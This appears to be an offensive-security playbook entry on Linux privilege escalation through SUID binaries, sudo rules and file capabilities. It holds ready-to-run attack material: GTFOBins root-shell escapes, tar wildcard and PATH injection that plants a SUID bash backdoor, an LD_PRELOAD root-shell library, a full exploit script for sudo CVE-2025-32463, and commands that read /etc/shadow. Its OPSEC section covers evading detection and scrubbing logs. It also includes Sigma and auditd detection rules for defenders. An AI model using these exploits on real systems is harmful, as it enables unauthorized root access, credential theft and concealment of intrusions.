# SUID/SGID, sudo & Capabilities

The "userland misconfig" cluster: the highest-yield, lowest-noise LPE class on real engagements.
Covers SUID/SGID + GTFOBins, sudo misconfiguration escapes, the 2025 sudo CVEs that defeat default
configs, Linux file capabilities, and `LD_PRELOAD`/`LD_LIBRARY_PATH` hijacking via sudo `env_keep`.

## Theory / mechanism

- **SUID/SGID**: a file with the set-user-ID bit runs with the file owner's UID regardless of the
  caller. If that binary can be coerced into running arbitrary commands (or reading/writing arbitrary
  files), the caller inherits the owner's (often root's) privileges. GTFOBins catalogs the exact
  primitive (shell, file read, file write, library load) per binary.
- **sudo**: grants specific commands as another user. Misconfigured rules (`NOPASSWD`, overly broad
  command globs, GTFOBins-able binaries, `env_keep`) let an attacker pivot the allowed command into a
  shell.
- **Capabilities**: root's monolithic power split into ~40 units (`man 7 capabilities`). A binary with
  `cap_setuid+ep` can call `setuid(0)`; `cap_dac_read_search` reads any file; `cap_sys_admin` is
  near-root (mount, etc.). The `+ep` flag set (Effective + Permitted) is what makes a cap directly
  usable.

## SUID/SGID enumeration → GTFOBins

```bash
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -perm -2000 -type f 2>/dev/null          # SGID
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null
# Quiet variant (PATH only): for d in $(echo $PATH|tr : ' '); do find $d -perm -4000 2>/dev/null; done
```

`scripts/cap_suid_hunter.sh` does this and **flags only entries present in a built-in GTFOBins list**
so you skip the dozens of benign SUID binaries (`passwd`, `mount`, `su`, `ping`).

### Classic GTFOBins SUID escapes (run binary directly; `-p` preserves euid)

```bash
# Always-on classics — run as the SUID binary:
find . -exec /bin/sh -p \; -quit              # find
/usr/bin/env /bin/sh -p                       # env
vim -c ':py3 import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'   # vim
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'   # python (SUID)
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh -p";'  # perl
awk 'BEGIN {system("/bin/sh -p")}'            # awk/gawk
bash -p                                        # if bash itself is SUID (rare)
cp /bin/dash /tmp/r; /usr/bin/cp --no-preserve=mode ...   # file-write SUIDs
nmap --interactive  # very old SUID nmap: then '!sh'   (legacy)
```

**SUID shared-library / `$PATH` hijack** — if a SUID binary calls another program by relative name or
loads a writable `.so`:

```bash
strace -f -e trace=execve,open,openat /path/suidbin 2>&1 | grep -E 'ENOENT|exec'
# If it runs e.g. `service` via PATH: prepend a writable dir with a fake binary
mkdir -p /dev/shm/p && printf '#!/bin/sh\ncp /bin/bash /tmp/.b && chmod 4755 /tmp/.b\n' > /dev/shm/p/service
chmod +x /dev/shm/p/service; PATH=/dev/shm/p:$PATH /path/suidbin
# If it dlopen()s a missing/writable lib in CWD or RPATH -> drop a malicious .so there.
```

## sudo misconfiguration

```bash
sudo -n -l 2>/dev/null   # non-interactive list; NOPASSWD entries are listed without a password
```

GTFOBins sudo escapes (when the rule lets you run the binary as root):

```bash
sudo vim -c ':!/bin/sh'                 sudo less /etc/hosts   # then !/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'    sudo find . -exec /bin/sh \; -quit
sudo env /bin/sh                        sudo python3 -c 'import pty;pty.spawn("/bin/bash")'
sudo perl -e 'exec "/bin/sh";'          sudo nmap --interactive   # legacy
sudo tar -cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh   # tar
sudo systemctl     # then in pager: !sh ; or sudo systemctl link / edit a unit
sudo apt-get changelog apt  # then !/bin/sh   (apt-get GTFOBins)
```

**Argument/wildcard injection** — a rule like `(root) NOPASSWD: /usr/bin/tar czf /backup/* `, or a
script invoked with `*`, lets you smuggle option args. With `tar`:

```bash
cd /writable/backup/dir
echo 'cp /bin/bash /tmp/.b && chmod 4755 /tmp/.b' > sh.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh sh.sh'
# next backup run executes sh.sh as root
```

### LD_PRELOAD / LD_LIBRARY_PATH via sudo env_keep

If `sudo -l` shows `env_keep+=LD_PRELOAD` (or `LD_LIBRARY_PATH`), and you may run *any* command as root:

```c
// pe.c  — gcc -fPIC -shared -nostartfiles -o /dev/shm/pe.so pe.c
#include <stdlib.h>
#include <unistd.h>
void _init(){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash -p"); }
```
```bash
gcc -fPIC -shared -nostartfiles -o /dev/shm/pe.so pe.c
sudo LD_PRELOAD=/dev/shm/pe.so /usr/bin/<any-allowed-command>
# LD_LIBRARY_PATH variant: build a fake libcrypt.so.1 etc. that the allowed binary links against.
```

## sudo CVE-2025-32462 — host option LPE (VERIFIED)

**Affected:** sudo 1.8.8–1.9.17 (stable 1.9.0–1.9.17, legacy 1.8.8–1.8.32). Fixed in **1.9.17p1**.
Discovered by Rich Mirch (Stratascale CRU); CVSS 8.8 (NVD), latent ~12 years (CWE-863).

**Root cause:** `-h`/`--host` was meant only with `-l` (list privileges for another host), but the
supplied hostname was trusted during *rule evaluation* even when running a command — making the host
field of a sudoers rule irrelevant. **Precondition:** sudoers contains host-specific rules (not `ALL`
host) — common with a shared sudoers file across many machines, or LDAP/SSSD-based sudoers.

```bash
# Rule example:  alice cerebus = (ALL) ALL    (current host is NOT cerebus)
sudo -l -h cerebus            # discover privileges granted on the other host
sudo -h cerebus id            # bug: command actually runs -> uid=0(root)
sudo -h cerebus /bin/bash     # root shell on a host you have no local rule for
```

Detection of vulnerability state: `sudo --version` in the 1.8.8–1.9.17 range with any non-`ALL` host
rule. `scripts/sudo_cve_2025_check.sh` parses the version and `sudo -l` output for host-restricted
rules. **No workaround** — patch to 1.9.17p1; audit all `Host`/`Host_Alias` rules and LDAP sudoers.

## sudo CVE-2025-32463 — chroot/NSS LPE (VERIFIED, exploited in the wild)

**Affected:** sudo 1.9.14–1.9.17 (inclusive). Fixed in **1.9.17p1**. Discovered by Rich Mirch
(Stratascale CRU). Critical (reports 7.8–9.8). Added to **CISA KEV** (Sep 30 2025) — actively
exploited. Works against **default sudo config**, requires only an unprivileged user + a writable dir.

**Root cause (CWE-829/-426):** sudo 1.9.14 moved path resolution *inside* the chroot before sudoers
evaluation. With `-R`/`--chroot`, sudo performs an NSS lookup while chrooted into an attacker-built
tree, so it reads the attacker's `/etc/nsswitch.conf` and `dlopen()`s an attacker-supplied
`libnss_*.so` as root → arbitrary code execution.

**Vuln test:** `sudo -R $(pwd) /bin/true` → if it errors with "No such file or directory" (rather than
"unknown user"), it's the vulnerable path.

**Full working exploit (matches public PoCs / Stratascale advisory):**

```bash
#!/bin/sh
# CVE-2025-32463 — sudo chroot NSS injection -> root.  sudo 1.9.14-1.9.17, default config.
set -e
STG=$(mktemp -d /tmp/sudowoot.XXXXXX)
cd "$STG"
mkdir -p woot libnss_ etc

# 1. malicious NSS module: constructor sets uid/gid 0 and spawns a root shell
cat > woot1337.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void){
    setreuid(0,0); setregid(0,0);
    chdir("/");
    execl("/bin/bash","/bin/bash",NULL);
}
EOF
gcc -shared -fPIC -Wl,-init,woot -o "libnss_/woot1337.so.2" woot1337.c

# 2. nsswitch.conf inside the chroot pointing passwd at our module name "woot1337"
echo "passwd: /woot1337" > etc/nsswitch.conf

# 3. trigger: chroot into our staging dir; sudo loads libnss_woot1337.so.2 as root
sudo -R "$STG" woot 2>/dev/null || sudo -R "$STG" id
# Result: bash with uid=0(root)
```

`scripts/sudo_cve_2025_check.sh` runs the version + vuln test and can drop this PoC under `--exploit`.

## Linux capabilities

```bash
getcap -r / 2>/dev/null              # enumerate file capabilities
cat /proc/$$/status | grep Cap       # current process caps (decode with capsh --decode=)
capsh --print
```

| Capability | Primitive | Exploit |
|------------|-----------|---------|
| `cap_setuid+ep` | become uid 0 | `./python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'`; perl/ruby/node equivalents |
| `cap_setgid+ep` | become gid 0 (then read group-readable secrets) | `os.setgid(0)` then access `/etc/shadow` via shadow group on some distros |
| `cap_dac_read_search+ep` | read ANY file | `./tar -cvf /tmp/s.tar /etc/shadow && tar -xf /tmp/s.tar`; or `gdb`/`vim`/`zip` file-read |
| `cap_dac_override+ep` | write ANY file | overwrite `/etc/passwd` or a root cron/unit; `vim`/`python` file-write |
| `cap_sys_admin+ep` | near-root: mount, etc. | mount a crafted fs, or fake `/etc/passwd` via bind/overlay; cgroup tricks |
| `cap_sys_ptrace+ep` | inject into processes | attach to a root process / `/proc/<pid>/mem` shellcode injection |
| `cap_chown+ep` | chown any file | `chown $(id -u) /etc/shadow` then read/edit |

```bash
# cap_setuid on python:
./python3 -c 'import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'
# cap_dac_read_search on tar -> read /etc/shadow without being root:
./tar -czf /dev/shm/s.tgz /etc/shadow && tar -xzf /dev/shm/s.tgz -C /dev/shm && cat /dev/shm/etc/shadow
```

## Detection

**Sigma — sudo CVE-2025-32463 chroot exploitation (linux process_creation):**

```yaml
title: Potential sudo chroot NSS Privilege Escalation (CVE-2025-32463)
id: 9f1b22ad-7e44-4c0a-8a3e-cve202532463
logsource:
  product: linux
  category: process_creation
detection:
  selection_sudo:
    Image|endswith: '/sudo'
    CommandLine|contains:
      - ' -R '
      - ' --chroot'
  condition: selection_sudo
level: high
```

**auditd:**
```
-w /etc/nsswitch.conf -p wa -k nss_change                 # fake nsswitch in chroot tree
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/sudo -k sudo_exec
-a always,exit -F arch=b64 -S setuid -F a0=0 -F auid>=1000 -F auid!=unset -k uid0_setuid
-w /etc/sudoers -p wa -k sudoers
```

**IOCs / EDR:**
- CVE-2025-32463: syslog `sudo` entry with `CHROOT=`; a fresh dir containing `etc/nsswitch.conf` +
  `libnss_*.so.2`; `gcc -shared` immediately before a `sudo -R`.
- CVE-2025-32462: `sudo` with `-h <name>` not paired with `-l`, where `<name>` != real hostname.
- SUID escape: a shell process whose euid==0 but ruid!=0, parented by a non-root user; `-p` flag on shells.
- Capabilities: `setuid(0)` syscall from a process started by an interpreter with a non-standard cap set.
- LD_PRELOAD: `sudo` execve carrying `LD_PRELOAD=`/`LD_LIBRARY_PATH=` env; freshly built `.so` in `/dev/shm`.

Elastic ships a prebuilt rule **"Potential CVE-2025-32463 Sudo Chroot Execution Attempt"** (8.19+).

## OPSEC

- **Touches:** `auditd execve` (records full argv + env incl. `LD_PRELOAD`/`GLIBC_TUNABLES`), sudo's
  syslog entries, dropped `.c`/`.so` files, chroot tree for CVE-2025-32463.
- **Cleanup:** `shred -u` the compiled `.so`/`.c`; `rm -rf` the chroot staging dir; detach loop/mounts;
  remove `/tmp/.b` SUID backups when finished; scrub the `sudo` log lines only if you have root and ROE allows.
- **Evasion:** build in `/dev/shm` (tmpfs); use the *quietest* GTFOBins primitive (file-read caps via
  `tar` are quieter than spawning a `-p` shell); prefer the sudo CVEs (clean-ish log) over noisy
  kernel exploits when the version is in range; avoid `gcc` on hosts where a compiler execve from your
  user is anomalous (precompile elsewhere, drop the `.so`).

## References

- Stratascale, **CVE-2025-32463 sudo chroot** — https://www.stratascale.com/ (Stratascale CRU advisory)
- Sudo project, **CVE-2025-32462 host option advisory** — https://www.sudo.ws/security/advisories/host_any/
- oss-security CVE-2025-32462 — https://www.openwall.com/lists/oss-security/2025/06/30/2
- Help Net Security, sudo LPE fixes — https://www.helpnetsecurity.com/2025/07/01/sudo-local-privilege-escalation-vulnerabilities-fixed-cve-2025-32462-cve-2025-32463/
- CISA KEV (CVE-2025-32463) — https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- **GTFOBins** (SUID/sudo/capabilities tables) — https://gtfobins.github.io
- HackTricks, *Linux Capabilities* — https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities
